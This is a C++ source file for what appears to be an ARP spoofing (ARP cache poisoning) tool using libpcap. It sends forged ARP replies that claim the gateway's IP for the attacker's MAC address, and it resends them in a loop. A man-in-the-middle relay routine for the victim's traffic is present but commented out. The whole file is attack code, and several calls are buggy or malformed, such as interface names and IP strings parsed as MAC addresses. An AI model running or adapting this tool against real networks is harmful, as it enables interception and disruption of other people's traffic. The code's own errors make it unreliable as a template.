#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <stdlib.h>
#include <iostream>
#include <pcap.h>
#include <signal.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <pthread.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <sys/stat.h>
#include <sys/ioctl.h>

using namespace std;

#define PROMISCUOUS 1
#define	ETHERTYPE_ARP		0x0806
#define	ETHERTYPE_IP		0x0800

    struct ether_arp_hdr
    {
          unsigned char   	h_dest[6];	/* destination eth addr	*/
          unsigned char   	h_source[6];	/* source ether addr	*/
          unsigned short    h_proto;		/* packet type ID field	*/

          unsigned short int ar_hrd;		/* Format of hardware address.  */
          unsigned short int ar_pro;		/* Format of protocol address.  */
          unsigned char ar_hln;		/* Length of hardware address.  */
          unsigned char ar_pln;		/* Length of protocol address.  */
          unsigned short int ar_op;		/* ARP opcode (command).  */

          unsigned char __ar_sha[6];	/* Sender hardware address.  */
          unsigned char __ar_sip[4];		/* Sender IP address.  */
          unsigned char __ar_tha[6];	/* Target hardware address.  */
          unsigned char __ar_tip[4];		/* Target IP address.  */

    };

    struct ether_arp_hdr *eth_arp_hdr;
    struct ifreq ifr;


 char change_mac(char mac[], unsigned char *packet) {

     sscanf(mac, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", &packet[0], &packet[1], &packet[2], &packet[3], &packet[4], &packet[5]);
 }

 int get_my_mac(char *dev, unsigned char *packet) {

     int fd;
     fd = socket(AF_INET, SOCK_DGRAM, 0);
     if(fd < 0) {
         cout << "Socket error" << endl;
         return -1;
     }

     strncpy(ifr.ifr_ifrn.ifrn_name, dev, strlen(dev));
     if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
         cout << "Mac error" << endl;
         return -1;
     }

     for(int i=0; i<6; i++) {
         packet[i] = (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i];
     }
 }

 int put_ip(char argv[], unsigned char *packet) {

     sockaddr_in addr;
     addr.sin_addr.s_addr = inet_addr(argv);
     memcpy(packet, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr));

 }

 int arp_packet(int op) {

     eth_arp_hdr->h_proto = htons(ETHERTYPE_ARP);
     eth_arp_hdr->ar_hrd = htons(0x0001);
     eth_arp_hdr->ar_pro = htons(0x0800);
     eth_arp_hdr->ar_hln = 0x06;
     eth_arp_hdr->ar_pln = 0x04;
     eth_arp_hdr->ar_op = htons(op);

 }

 int arp_infection_packet(char dev[], char gateway_ip[], char victim_ip[], char victim_mac[], pcap_t *pcd) {

     change_mac(victim_mac, eth_arp_hdr->h_dest);
     get_my_mac(dev, eth_arp_hdr->h_source);

     // ARP reply
     arp_packet(0x0002);

     get_my_mac(dev, eth_arp_hdr->__ar_sha);
     put_ip(gateway_ip, eth_arp_hdr->__ar_sip);
     change_mac(dev, eth_arp_hdr->__ar_tha);
     put_ip(victim_ip, eth_arp_hdr->__ar_tip);

     if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
              cout << "Error send infaction packet" << endl;
              return -1;
     }
     else cout << "Send infaction packet" << endl;
 }

 int arp_request(char dev[], char gateway_ip[], char victim_ip[], char victim_mac[], pcap_t *pcd) {

    // Attacker -> Target
     memset(eth_arp_hdr->h_dest, 0xff, 6);
     get_my_mac(dev, eth_arp_hdr->h_source);

     // Arp request
     arp_packet(0x0001);

     get_my_mac(dev, eth_arp_hdr->__ar_sha);
     put_ip(victim_ip, eth_arp_hdr->__ar_sip);
     memset(eth_arp_hdr->__ar_tha, 0xff, 6);
     put_ip(gateway_ip, eth_arp_hdr->__ar_tip);

     if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
              cout << "Error arp request packet" << endl;
              return -1;
     }
     else cout << "Send arp request packet" << endl;
 }

 int relay_ip_packet(char dev[], char gateway_ip[], char victim_ip[], char victim_mac[], pcap_t *pcd) {

     struct ethhdr *ep;
     struct pcap_pkthdr *pkthdr;
     const u_char *packet;
     int res;

     while((res = pcap_next_ex(pcd, &pkthdr, &packet)) >= 0) {

         if(res == 0) continue;
         if(res < 0) {
             cout << "Error reading the packets" << pcap_geterr(pcd);
             exit(1);
         }

         ep = (struct ethhdr*)packet; // Get packet



        /* // Attacker -> Victim
         get_my_mac(dev, eth_arp_hdr->h_source);
         change_mac(victim_ip, eth_arp_hdr->h_dest);

         // (Src)Victim -> (Dst)Attacker, Get victim packet.
         if((memcmp(ep->h_source, eth_arp_hdr->h_source, sizeof(ep->h_source)))
                 && memcmp(ep->h_dest, eth_arp_hdr->h_dest, sizeof(ep->h_dest))) {

             // (Src)Attacker -> (Dst)Gateway, Send victim packet
             change_mac(gateway_ip, ep->h_dest);
             get_my_mac(dev, ep->h_source);

             if(pcap_sendpacket(pcd, (const u_char*)ep, 42) != 0) {
                      cout << "Error relay packet" << endl;
                      return -1;
             }
             else cout << "Send relay packet" << endl;
         }*/
         break;
    }

 }

 typedef struct {

     char *argv[];
     pcap_t *pcd;

 }thread_args;

 void *infection_thread(void *thr) {

     thread_args *args = (thread_args *)thr;
     char *dev = args->argv[1];
     char *gateway_ip = args->argv[2];
     char *victim_ip = args->argv[3];
     char *victim_mac = args->argv[4];
     pcap_t *pcd = args->pcd;

     arp_infection_packet(dev, gateway_ip, victim_ip, victim_mac, pcd);

 }

 void *relay_thread(void *thr) {

     thread_args *args = (thread_args *)thr;
     char *dev = args->argv[1];
     char *gateway_ip = args->argv[2];
     char *victim_ip = args->argv[3];
     char *victim_mac = args->argv[4];
     pcap_t *pcd = args->pcd;

     arp_request(dev, gateway_ip, victim_ip, victim_mac, pcd);
     sleep(1);
     relay_ip_packet(dev, gateway_ip, victim_ip, victim_mac, pcd);

 }

int main(int argc, char *argv[])
{
    if (argc != 5) {
        cout << "Usage : " << argv[0] << " Device Target_ip Sender_ip My_mac Sender_mac ip_network_address";
        return -1;
    }

    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    cout << endl << "Device : " << dev << endl << endl;

    pcap_t *pcd; // packet captuer descripter
    if ((pcd = pcap_open_live(dev, BUFSIZ, PROMISCUOUS, 500, errbuf)) == NULL) {
        cout << "Unable to open the Adapter.";
        return -1;
    }

    eth_arp_hdr = new ether_arp_hdr;

    pthread_t t1, t2;
    thread_args thr;

    thr.argv[1] = argv[1];
    thr.argv[2] = argv[2];
    thr.argv[3] = argv[3];
    thr.argv[4] = argv[4];
    thr.pcd = pcd;

    struct ethhdr *ep;
    struct pcap_pkthdr *pkthdr;
    const u_char *packet;
    int res;



    while(1) {
        pthread_create(&t1, NULL, infection_thread, &thr);
        pthread_create(&t2, NULL, relay_thread, &thr);
            cout << endl << " --------------- " << endl;
            sleep(3);

    }
}
